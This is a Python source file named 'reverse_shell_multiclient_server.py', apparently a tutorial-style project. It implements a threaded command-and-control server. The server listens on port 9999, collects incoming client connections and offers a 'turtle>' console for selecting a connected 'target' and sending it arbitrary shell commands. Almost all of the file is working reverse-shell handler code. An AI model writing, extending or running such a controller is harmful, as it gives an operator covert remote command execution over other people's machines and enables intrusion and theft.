from re import L
import socket
import sys
import time
import threading
from queue import Queue


NUMBER_OF_THREADS = 2
JOB_NUMBER = [1, 2]
queue = Queue()

global host
global port 
global s 

# ----------------- THREAD 1 functions -----------------


# create a Socket
def create_socket():
    global host
    global port 
    global s 

    host = ''
    port = 9999 # port that are not being used a lot
    try:
        s = socket.socket()
    except socket.error as msg:
        print('Socket creation error: ', str(msg))


# bind the Socket and listen to connections
def bind_socket():
    global host
    global port 
    global s 

    print("Binding the Port: ", str(port))
    try:
        s.bind((host, port))
        s.listen(5) # num of errors that it's going to tolerate before it throws exception
    except socket.error as msg:
        print('Socket creation error: ', str(msg), '\n', 'Retrying...')
        bind_socket()


# handling connections from multiple clients
# closing previous connections when Server is restarted
def accept_connections(all_connections, all_address):
    for conn in all_connections:
        conn.close()

    del all_connections[:]
    del all_address[:]

    while True:
        try:
            conn, addr = s.accept()
            s.setblocking(True)         # prevents timeout
            all_connections.append(conn)
            all_address.append(addr)
            print("Connection has been established! | IP ", addr[0], " | Port ", addr[1])
        except:
            print('Error in accep_connections()')


# ----------------- THREAD 2 functions -----------------


# 2nd thread functions - 1) See all the clients 2) Select a client 3) Send commands to connected clients
# trutle>
# turtle> list
# 0 Client-A Port
# 1 Client-B Port
# 2 Client-C Port
# turtle> select 1
def start_turtle(all_connections, all_address):
    while True:
        cmd = input('turtle>')

        if cmd == 'list':
            list_connections(all_connections, all_address)
        
        elif 'select' in cmd:
            conn = get_target(cmd)
            if conn is not None:
                service_target(conn)
            else:
                print('Command not recognized.')


# Display all active connections with the client
def list_connections(all_connections, all_address):
    results = ''
    for id, conn in enumerate(all_connections):
        try:
            conn.send(str.encode(' '))
            conn.recv(1024)
        except:
            del all_connections[id]
            del all_address[id]
            continue
        results = results + str(id) + ' ' + str(all_address[id][0]) + ' ' + str(all_address[id][1]) + '\n'

    print('--- Clients ---\n' + results)

    return


# Selecting the target
def get_target(cmd):
    try:
        target = int(cmd.split(' ')[-1])
        conn = all_connections[target]
        print('You are now connected to : ', str(all_address[target][0]))
        print(str(all_address[target][0]) + '>', end='')
        # 192.168.0.4>
    except:
        print('Selection not valid!')
        return None

    return conn


# Service target connections
def service_target(conn):
    while True:
        result = send_commands(conn)
        if result != 0:
            break
    # conn.close()
    return


# send commands to client
def send_commands(conn):
    try:
        cmd = input()                               # waits for server user input
        if cmd == 'quit':                           # server user wants to quit the program and the connection
            return -1
        elif len(str.encode(cmd)) > 0:              # server user wants to send commands to client
            conn.send(str.encode(cmd))              # encode cmd into bytes to be able to send to client
            client_response = str(conn.recv(1024),  # receive response from client
                                    'utf-8') 
            print(client_response, end="")          # print to server console
            return 0
    except:
        print('Command not recognized!')
        return -1


# Create worker threads
def create_threads():
    for _ in range(NUMBER_OF_THREADS):
        t = threading.Thread(target=work)
        t.daemon = True
        t.start()


# Create job queues
def create_jobs():
    for x in JOB_NUMBER:
        queue.put(x)
    
    queue.join()


# Do next job that is in the queue (handle conn, service conn)
def work():
    while True:
        x = queue.get()
        if x == 1:
            create_socket()
            bind_socket()
            accept_connections(all_connections, all_address)
        elif x == 2:
            start_turtle(all_connections, all_address)
        
        queue.task_done()


if __name__ == "__main__":
    print('\n=======\nreverse_shell_multiclient_server.py\n=======\n')

    all_connections = []
    all_address = []

    create_threads()
    create_jobs()
